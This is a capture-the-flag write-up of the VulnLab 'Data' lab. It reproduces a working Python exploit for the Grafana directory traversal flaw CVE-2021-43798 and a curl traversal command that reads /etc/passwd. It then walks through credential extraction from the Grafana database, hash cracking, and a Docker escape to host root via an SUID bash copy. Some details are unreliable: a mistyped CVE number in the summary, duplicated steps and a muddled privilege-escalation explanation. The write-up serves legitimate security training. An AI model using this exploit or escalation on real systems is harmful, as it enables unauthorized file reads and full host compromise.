---
title: Data
date: 2025-12-31 13:16:55
categories: ["VulnLab"]
tags: ["Web", "Grafana", "SSH", "sqlite3", "Docker"]
cover: \images\Data\data_vl.png
---
# TLDR
Data is an easy lab from VulnLabs. Learn to exploit the CVE-2021-23798 on Grafana, analyse database files and abuse excessive Docker privileges to escalate to root from a container to the host machine.


# Enumeration

![Nmap scan](\images\Data\nmap.png)
```bash
nmap -p- -A 10.10.108.123
```
- The target IP address is 10.10.108.123. Ports 22 and 3000 are open.

## SSH (22)

![SSH password authentication](\images\Data\ssh.png)
```bash
ssh jon@data.vl
```
- Password authentication is enabled on the target server. If a password is found later, test it for password reuse.

## HTTP (3000)
![HTTP dirsearch](\images\Data\dirsearch.png)
```bash
dirsearch -u http://data.vl:3000
```
- Several directories were found with HTTP status codes 200 and 302.

## Website Features
![Grafana Login page](\images\Data\grafana.png)
- Grafana version 8.0 is running on the HTTP server.

![healthz directory](\images\Data\healthz_directory.png)
- The `/healthz` directory returns an “Ok” response.

![metrics directory](\images\Data\healthz_directory.png)
- The `/metrics` directory returns HTTP server log data.

---

# Gaining a Foothold
## CVE-2021-43798 (Directory Traversal & Arbitrary Read File)

```bash
# Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
# Date: 08/12/2021
# Exploit Author: s1gh
# Vendor Homepage: https://grafana.com/
# Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
# Version: V8.0.0-beta1 through V8.3.0
# Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.
# CVE: CVE-2021-43798
# Tested on: Debian 10
# References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys
from random import choice

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:
        return


if __name__ == '__main__':
    main()
    sys.exit(0)
```
- We’ll use [this exploit from ExploitDB](https://www.exploit-db.com/exploits/50581) to read files on the HTTP server. This vulnerability affects versions **v8.0-beta through v8.3.0**.

### Reading `/etc/passwd` 
![etc/passwd contents](\images\Data\etc_passwd.png)
![download etc/passwd contents](\images\Data\download_etc_passwd.png)
```bash
python cve-2021-43798.py -H http://data.vl:3000
curl 'http://data.vl:3000/public/plugins/alterlist/../../../../../../../../etc/passwd' --path-as-is -o passwd
cat passwd
```
- We can read the `/etc/passwd` file on the HTTP server via **directory traversal**.
- Adding multiple `../` in the URL in the exploit, we can download the `/etc/passwd` file on Kali.

### Reading `/etc/grafana/grafana.ini`
![grafana.ini](\images\Data\grafana_ini.png)
- We found default admin credentials.

### Analysing `/var/lib/grafana/grafana.db`
![grafana_db](\images\Data\grafana_db.png)
- The `/var/lib/grafana/grafana.db` file can potentially store usernames and hashed passwords. We’ll save this file for further analysis.

![db_interact](\images\Data\db_interact.png)
- Interacting with the database tables, we find user credentials in the user table.
- *admin* is a **privileged** user while *boris* is a **non-privileged** user.

---

# Priv Esc
## Cracking Hashes

![admin_hash](\images\Data\hash.png)
- Save the password hashes and their associated salts into a file. 1 password and salt per line.

![Using grafana2hashcat.py](\images\Data\grafana2hashcat.png)
- Use [grafana2hashcat](https://github.com/iamaldi/grafana2hashcat) to convert the password hash into a format interpretable by Hashcat and crack it to get the plaintext.

# Post-Exploitation
!(ssh as boris to target)[\images\Data\ssh_to_target.png]
- SSH into the target server as boris to find the user.txt flag. Password reuse is confirmed here (SSH and SQL database)

## User Permissions
!(boris permissions)[\images\Data\boris_permissions.png]
- We can run the command `/snap/bin/docker.exe` **as root without any password authentication**. **Any arguments** can be passed to docker.exe.

![etc/passwd contents on target server](\images\Data\etc_passwd2.png)
- Reading `/cat/passwd` in the SSH shell, we get a **different** file as before, this time containing the entry for the **boris** user.
- Knowing that the 1st `/etc/passwd` file is in a docker container while the 2nd is on the host machine, this means we could access the host machine due to password reuse (SSH and SQL database)

## Accessing the Docker Container
![Accessing docker container](\images\Data\access_docker_container.png)
- With the docker privileges found earlier for boris, we can open an interactive Bash shell as root in the docker container. We ultimately want root privileges on the host machine.

## Exploiting Docker Container for PrivEsc to root on host machine
![Scanning docker container](\images\Data\container_vuln.png)
- With [deepce.sh](https://github.com/stealthcopter/deepce) (similar to WinPEAs but for Docker), host it on a HTTP sever on Kali Linux and download it onto the docker container.
- We see where certain files on the container are **redirected** from on the host machine. (i.e. `/var/snap/docker/common/.../hostname` on the host machine redirects to `/etc/hostname` on the container)

![Modify /etc/hostname](\images\Data\modify_etc_hostname.png)
- In the bash shell on the container, we can modify the contents of `/etc/hostname` to an arbitrary value. As boris in the SSH session, we can read the new contents of the `hostname` file **on the host machine**.
- As a low-privileged user, we can abuse this by modifying the value of the host machine’s `hostname` file to an executable file and get root access.

![Set global-write permissions on /etc/hostname](\images\Data\chmod_777_etc_hostname)
- In the bash shell on the container, set **world-writable permissions** on the `/etc/hostname` file.
- In the SSH session as boris, redirect the `/var/snap/docker/common/.../hostname` directory to the `/bin/bash` binary on the container. The container’s `/etc/hostname` file is now overwritten with the contents of the bash binary.

![Set world-writable permissions on /etc/hostname](\images\Data\chmod_777_etc_hostname)
- In the container, set `/etc/hostname` with world-writable privileges, the SUID and change its owner to root.
- In the SSH session as boris, redirect the `/var/snap/docker/common/.../hostname` directory to the `/bin/bash` binary on the container. The container’s `/etc/hostname` file is now overwritten with the contents of the bash binary.
- We can now access the host server as root.

![Access root SSH keys on target server](\images\Data\ssh_keys_root.png)
- We can access its SSH keys as root.

# My Takeaways
1. **How do we know that the 1st machine we pwned was a docker instance? How does the difference of the `/etc/passwd` contents indicate this?**
    
    Grafana is a service commonly run on docker instances (an active container) Each docker container has its own `/etc/passwd` file. Host users’ entries are never added into the file by default. The difference in the 2 files means the file accessed from the HTTP server is **not the host’s** `/etc/passwd` file, but the instance it’s running in. Hence, the 1st `/etc/passwd` file is in the container environment.
    
2. A docker instance must be hosted and running on a host machine. We eventually want to get root privileges on that host machine.
3. When running a command like `cat {file A} > {file B}`, you are overwriting the contents of the latter with the former.
4. In this lab, `/var/snap/docker/common/.../hostname` on the host machine redirects to `/etc/hostname` on the container. Running `cat /bin/bash > /var/snap/docker/common/.../hostname` changes the contents of `/etc/hostname` in the container. The host mount is unchanged. That is why you still run commands on `/etc/hostname` on the container. It gets weaponized to run a bash shell as root.